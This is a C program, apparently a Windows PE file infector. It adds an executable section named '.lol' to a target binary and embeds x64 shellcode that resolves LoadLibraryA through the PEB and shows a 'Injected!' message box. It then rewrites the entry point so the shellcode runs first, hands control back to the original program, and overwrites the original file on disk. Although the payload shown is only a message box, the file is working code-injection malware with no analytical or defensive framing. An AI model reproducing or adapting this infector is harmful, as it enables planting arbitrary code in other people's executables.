#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <windows.h>
#include <winternl.h>

#define ALIGN(x, align) ((x) + ((align) - (x) % (align)))

LONG szFileSize;

BYTE g_Payload[] = {
	0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x15, 0x2D, 0x01, 0x00, 0x00, 0xE8,
	0x60, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC1, 0xE8, 0x74, 0x00, 0x00, 0x00,
	0x48, 0x8D, 0x0D, 0xF9, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8D, 0x15,
	0x00, 0x01, 0x00, 0x00, 0x48, 0x89, 0xC1, 0xE8, 0x5C, 0x00, 0x00, 0x00,
	0x41, 0xB9, 0x10, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC0, 0x31, 0xC9, 0x48,
	0x8D, 0x15, 0xC6, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xE8, 0xFC, 0xFF, 0xFF,
	0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x90, 0x90, 0x49, 0x89, 0xC8, 0x49,
	0x89, 0xD1, 0x31, 0xC9, 0x41, 0x0F, 0xBE, 0x04, 0x08, 0x41, 0x0F, 0xBE,
	0x14, 0x09, 0x84, 0xC0, 0x74, 0x07, 0x48, 0xFF, 0xC1, 0x38, 0xD0, 0x74,
	0xEB, 0x29, 0xD0, 0xC3, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 0x48, 0x8B, 0x00,
	0x48, 0x8B, 0x00, 0x48, 0x8B, 0x40, 0x20, 0xC3, 0x55, 0x57, 0x56, 0x53,
	0x48, 0x83, 0xEC, 0x28, 0x45, 0x31, 0xDB, 0x48, 0x63, 0x41, 0x3C, 0x8B,
	0x9C, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xCB, 0x49, 0x89, 0xCA,
	0x48, 0x89, 0xD6, 0x8B, 0x7B, 0x20, 0x8B, 0x6B, 0x18, 0x48, 0x01, 0xCF,
	0x44, 0x39, 0xDD, 0x76, 0x3D, 0x42, 0x8B, 0x0C, 0x9F, 0x48, 0x89, 0xF2,
	0x4C, 0x01, 0xD1, 0xE8, 0x88, 0xFF, 0xFF, 0xFF, 0x41, 0x89, 0xC0, 0x49,
	0x8D, 0x43, 0x01, 0x45, 0x85, 0xC0, 0x75, 0x1D, 0x8B, 0x43, 0x24, 0x4D,
	0x01, 0xDB, 0x4D, 0x01, 0xD3, 0x41, 0x0F, 0xB7, 0x14, 0x03, 0x8B, 0x43,
	0x1C, 0x49, 0x8D, 0x14, 0x92, 0x8B, 0x04, 0x02, 0x4C, 0x01, 0xD0, 0xEB,
	0x07, 0x49, 0x89, 0xC3, 0xEB, 0xBE, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x28,
	0x5B, 0x5E, 0x5F, 0x5D, 0xC3, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x49, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x65, 0x64, 0x21, 0x00, 0x66, 0x0F,
	0x1F, 0x44, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64,
	0x6C, 0x6C, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x4D, 0x65, 0x73, 0x73,
	0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x0F, 0x1F, 0x40, 0x00,
	0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41,
	0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

typedef struct
{
    UINT_PTR              ImageBase;
    PIMAGE_DOS_HEADER     DOS;
    PIMAGE_NT_HEADERS     NT;
    PIMAGE_SECTION_HEADER Section;
} PE_FILE;

PVOID LoadFile(LPCSTR Name)
{
    FILE* fp;
    PVOID pBuffer;

    fp = fopen(Name, "rb");
    
    if (fp == NULL)
    {
        perror("[ERR]");
        exit(1);
    }

    fseek(fp, 0, SEEK_END);
    szFileSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    pBuffer = malloc(szFileSize);
    
    if (pBuffer == NULL)
    {
        perror("[ERR]");
        exit(1);
    }

    fread(pBuffer, szFileSize, 1, fp);
    fclose(fp);

    return pBuffer;
}

void SaveFile(PVOID pImage, LPCSTR Name, DWORD dwFileSize)
{
    FILE* fp = fopen(Name, "wb");

    if (fp == NULL)
    {
        perror("[ERR]");
        return;
    }

    fwrite(pImage, dwFileSize, 1, fp);
    fclose(fp);
}

int Inject(PE_FILE* pFile, DWORD dwSize)
{
    DWORD dwFreeSpace;
    DWORD dwNumOfSections;
    DWORD dwNewVirtualAddr;   
    DWORD dwFileAlign,        dwSectionAlign;
    DWORD dwLastVirtualAddr,  dwLastVirtualSize;
    DWORD dwLastPhysicalAddr, dwLastPhysicalSize;
    PIMAGE_SECTION_HEADER     pLastSection;

    dwNumOfSections = pFile->NT->FileHeader.NumberOfSections;
    pLastSection    = &pFile->Section[dwNumOfSections];
    dwFreeSpace     = (DWORD64)(pFile->ImageBase + pFile->Section[0].PointerToRawData) -
                      (DWORD64) &pFile->Section[dwNumOfSections];

    if (dwFreeSpace < sizeof(IMAGE_SECTION_HEADER))
    {
        printf("[ERR]: Can't insert section: Not enough space in table\n");
        return 1;
    }

    dwFileAlign        = pFile->NT->OptionalHeader.FileAlignment;
    dwSectionAlign     = pFile->NT->OptionalHeader.SectionAlignment;

    dwLastVirtualAddr  = pFile->Section[dwNumOfSections-1].VirtualAddress;
    dwLastVirtualSize  = pFile->Section[dwNumOfSections-1].Misc.VirtualSize;
    dwLastPhysicalAddr = pFile->Section[dwNumOfSections-1].PointerToRawData;
    dwLastPhysicalSize = pFile->Section[dwNumOfSections-1].SizeOfRawData;
    dwNewVirtualAddr   = dwLastVirtualAddr + dwLastVirtualSize;

    strcpy(pLastSection->Name, ".lol");
    pLastSection->Misc.VirtualSize = dwSize;
    pLastSection->VirtualAddress   = ALIGN(dwNewVirtualAddr, dwSectionAlign);
    pLastSection->SizeOfRawData    = ALIGN(dwSize, dwFileAlign);
    pLastSection->PointerToRawData = dwLastPhysicalAddr + dwLastPhysicalSize;
    pLastSection->Characteristics  = 0x60500060;

    *(DWORD32*)(g_Payload + 0x45) = (DWORD32)(pFile->NT->OptionalHeader.AddressOfEntryPoint - 
                                    (pLastSection->VirtualAddress + 0x49));

    pFile->NT->FileHeader.NumberOfSections++;
    pFile->NT->OptionalHeader.SizeOfImage         = ALIGN(pLastSection->VirtualAddress + dwSize, dwSectionAlign);
    pFile->NT->OptionalHeader.AddressOfEntryPoint = pLastSection->VirtualAddress;

    pFile->ImageBase = (UINT_PTR) realloc((PVOID)pFile->ImageBase, 
                        pLastSection->PointerToRawData + ALIGN(dwSize, dwFileAlign));

    if (pFile->ImageBase == 0)
        return 1;

    pFile->DOS       = (PIMAGE_DOS_HEADER) pFile->ImageBase;
    pFile->NT        = (PIMAGE_NT_HEADERS) (pFile->ImageBase + pFile->DOS->e_lfanew);
    pFile->Section   = (PIMAGE_SECTION_HEADER) &pFile->NT->OptionalHeader.DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    pLastSection     = &pFile->Section[dwNumOfSections];

    memcpy((PVOID)(pFile->ImageBase + pLastSection->PointerToRawData), g_Payload, dwSize);
    szFileSize = pLastSection->PointerToRawData + ALIGN(dwSize, dwFileAlign);

    return 0;
}

int main(int argc, char** argv)
{
    PBYTE   pImage;
    PE_FILE file;

    if (argc < 2)
    {
        printf("Usage: %s <file>\n", argv[0]);
        return 1;
    }

    pImage         = LoadFile(argv[1]);

    file.ImageBase = (UINT_PTR) pImage;
    file.DOS       = (PIMAGE_DOS_HEADER) pImage;
    file.NT        = (PIMAGE_NT_HEADERS) (pImage + file.DOS->e_lfanew);
    file.Section   = (PIMAGE_SECTION_HEADER) &file.NT->OptionalHeader.DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];

    if (Inject(&file, sizeof(g_Payload)) == 0)
    {
        SaveFile((PVOID)file.ImageBase, argv[1], szFileSize);
    }

    free((PVOID)file.ImageBase);
    return 0;
}
